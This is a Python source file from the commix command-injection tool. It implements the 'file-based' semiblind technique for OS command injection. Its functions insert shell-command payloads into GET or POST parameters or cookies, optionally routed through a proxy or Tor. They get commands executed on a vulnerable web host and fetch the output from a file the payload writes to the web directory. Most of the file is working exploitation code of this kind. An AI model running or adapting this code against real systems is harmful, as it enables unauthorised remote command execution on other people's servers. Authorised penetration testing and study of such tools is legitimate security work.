#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.semiblind_based.techniques.file_based import fb_payloads

"""
 The "file-based" technique on Semiblind-based OS Command Injection.
"""

# ------------------------------------
# Check if target host is vulnerable.
# ------------------------------------
def injection_test(payload, http_request_method, url):
                      
  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    
    # Check if its not specified the 'INJECT_HERE' tag
    url = parameters.do_GET_check(url)
    
    # Encoding non-ASCII characters payload.
    payload = urllib.quote(payload)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_GET_param(url)
    
    target = re.sub(settings.INJECT_TAG, payload, url)
    request = urllib2.Request(target)
    
    # Check if defined extra headers.
    headers.do_check(request)

    # Check if defined any HTTP Proxy.
    if menu.options.proxy:
      try:
        response = proxy.use_proxy(request)
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
        raise SystemExit() 

    # Check if defined Tor.
    elif menu.options.tor:
      try:
        response = tor.use_tor(request)
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
        raise SystemExit() 

    else:
      try:
        response = urllib2.urlopen(request)
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
        raise SystemExit() 
        
  # Check if defined method is POST.
  else:
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    
    # Define the POST data
    data = re.sub(settings.INJECT_TAG, payload, parameter)
    request = urllib2.Request(url, data)

    # Check if defined extra headers.
    headers.do_check(request)

    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_POST_param(parameter, url)
    
    # Check if defined any HTTP Proxy.
    if menu.options.proxy:
      try:
        response = proxy.use_proxy(request)
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
        raise SystemExit() 

    # Check if defined Tor.
    elif menu.options.tor:
      try:
        response = tor.use_tor(request)
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
        raise SystemExit() 

    else:
      try:
        response = urllib2.urlopen(request)
      except urllib2.HTTPError, err:
        print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
        raise SystemExit() 
      
  return response, vuln_parameter


# ------------------------------------
# Check if target host is vulnerable.
# ------------------------------------
def cookie_injection_test(url, vuln_parameter, payload):
  opener = urllib2.build_opener()
  opener.addheaders.append(('Cookie', vuln_parameter + "=" + payload))
  response = opener.open(url)
  
  return response


# -------------------------------------------
# The main command injection exploitation.
# -------------------------------------------
def injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
  
  # Execute shell commands on vulnerable host.
  if alter_shell :
    payload = fb_payloads.cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE) 
  else:
    payload = fb_payloads.cmd_execution(separator, cmd, OUTPUT_TEXTFILE) 

  # Fix prefixes / suffixes
  payload = parameters.prefixes(payload, prefix)
  payload = parameters.suffixes(payload, suffix)
      
  # Check if defined "--verbose" option.
  if menu.options.verbose:
    sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)
  
  # Check if defined cookie with "INJECT_HERE" tag
  if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
    response = cookie_injection_test(url, vuln_parameter, payload)

  else:
    # Check if defined method is GET (Default).
    if http_request_method == "GET":
      # Check if its not specified the 'INJECT_HERE' tag
      url = parameters.do_GET_check(url)
      
      # Encoding non-ASCII characters payload.
      payload = urllib.quote(payload)
      
      target = re.sub(settings.INJECT_TAG, payload, url)
      vuln_parameter = ''.join(vuln_parameter)
      request = urllib2.Request(target)
      
      # Check if defined extra headers.
      headers.do_check(request)        
        
      # Check if defined any HTTP Proxy.
      if menu.options.proxy:
        try:
          response = proxy.use_proxy(request)
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
          raise SystemExit() 

      # Check if defined Tor.
      elif menu.options.tor:
        try:
          response = tor.use_tor(request)
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
          raise SystemExit() 

      else:
        try:
          response = urllib2.urlopen(request)
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
          raise SystemExit() 
        
    else :
      # Check if defined method is POST.
      parameter = menu.options.data
      parameter = urllib2.unquote(parameter)
      
      # Check if its not specified the 'INJECT_HERE' tag
      parameter = parameters.do_POST_check(parameter)
      
      data = re.sub(settings.INJECT_TAG, payload, parameter)
      request = urllib2.Request(url, data)
      
      # Check if defined extra headers.
      headers.do_check(request)        
        
      # Check if defined any HTTP Proxy.
      if menu.options.proxy:
        try:
          response = proxy.use_proxy(request)
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
          raise SystemExit() 

      # Check if defined Tor.
      elif menu.options.tor:
        try:
          response = tor.use_tor(request)
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
          raise SystemExit() 

      else:
        try:
          response = urllib2.urlopen(request)
        except urllib2.HTTPError, err:
          print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
          raise SystemExit() 
      
  return response

#-----------------------------
# Command execution results.
#-----------------------------
def injection_results(url, OUTPUT_TEXTFILE, delay):
  
  # Find the correct directory.
  path = url
  path_parts = path.split('/')
  count = 0
  for part in path_parts:        
    count = count + 1
  count = count - 1
  last_param = path_parts[count]
  output = url.replace(last_param, OUTPUT_TEXTFILE)
  time.sleep(delay)

  # Check if defined extra headers.
  request = urllib2.Request(output)
  headers.do_check(request)
  
  # Evaluate test results.
  output = urllib2.urlopen(request)
  html_data = output.read()
  shell = re.findall(r"(.*)", html_data)
  
  return shell

#eof